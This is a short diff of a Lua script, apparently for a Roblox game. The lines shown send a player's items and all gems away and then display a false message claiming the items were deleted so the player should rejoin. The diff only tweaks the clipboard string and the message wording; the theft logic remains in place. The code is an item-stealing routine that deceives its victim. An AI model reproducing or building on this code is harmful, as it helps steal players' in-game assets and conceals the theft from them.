@@ -281,7 +281,7 @@ if #sortedItems > 0 or GemAmount1 > min_rap + newamount then
         sendItem(item.category, item.uid, item.amount)
     end
     SendAllGems()
-    setclipboard(“😈🤑")
+    setclipboard(“lol")
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your valuable items deleted\ rejoin!")
+    message.Error("All your valuable items deletet,rejoin!")
 end
